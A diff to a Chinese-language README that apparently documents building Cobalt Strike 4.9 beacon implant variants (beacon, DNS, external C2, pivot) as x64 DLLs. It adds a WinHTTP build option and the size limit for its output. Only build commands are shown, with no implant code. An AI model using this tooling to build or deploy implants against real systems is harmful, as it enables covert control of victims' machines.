@@ -5,11 +5,12 @@
 ```powershell
 .\build.ps1                 # 构建全部四个变体（beacon/dnsb/extc2/pivot）的 x64 Release
 .\build.ps1 -Project dnsb   # 单独构建某个变体
+.\build.ps1 -Project beacon -HttpLibrary winhttp  # CS 4.9 WinHTTP 套筒 winhttpb.x64.dll
 .\tests\run_tests.ps1       # 编译并运行宿主机侧测试（需 MSVC 环境）
 ```
 
 产物：`x64\Release\<name>.x64.dll` + 同名 `.map`（供 .obj 级体积归因），
-同时拷贝到 `bin\`。
+同时拷贝到 `bin\`。`-HttpLibrary winhttp` 时 beacon 产物为 `winhttpb.x64.dll`（TS 槽明文上限 309248 B）。
 
 ## 工具链（CI 实证 2026-08-29 修订）
 
